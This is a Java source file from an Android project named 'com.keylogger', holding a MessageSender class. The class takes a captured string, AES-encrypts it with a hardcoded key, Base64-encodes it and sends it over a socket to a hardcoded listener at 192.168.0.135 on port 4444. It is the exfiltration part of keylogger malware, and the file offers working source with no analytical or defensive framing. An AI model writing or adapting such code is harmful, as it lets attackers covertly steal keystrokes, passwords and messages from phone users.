package com.keylogger;

import android.os.AsyncTask;
import android.os.Build;

import androidx.annotation.RequiresApi;

import java.io.PrintWriter;
import java.net.Socket;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.security.Key;
import java.nio.charset.StandardCharsets;
import java.util.Base64;

public class MessageSender extends AsyncTask<String, Void, Void> {
	private static final String IP = "192.168.0.135";
	private static final int PORT = 4444;
	private static final String SECRET_KEY = "aesEncryptionKey";

	@RequiresApi(api = Build.VERSION_CODES.O)
	@Override
	protected Void doInBackground(String... strings) {
		String message = strings[0];
		try {
			Socket socket = new Socket(IP, PORT);
			PrintWriter printWriter = new PrintWriter(socket.getOutputStream());

			// Encrypt the message
			byte[] encryptedMessage = encrypt(message, SECRET_KEY);
			printWriter.write(Base64.getEncoder().encodeToString(encryptedMessage));

			printWriter.flush();
			printWriter.close();
			socket.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return null;
	}

	private static byte[] encrypt(String message, String secretKey) throws Exception {
		Key key = new SecretKeySpec(secretKey.getBytes(), "AES");
		Cipher cipher = Cipher.getInstance("AES");
		cipher.init(Cipher.ENCRYPT_MODE, key);
		return cipher.doFinal(message.getBytes());
	}
}
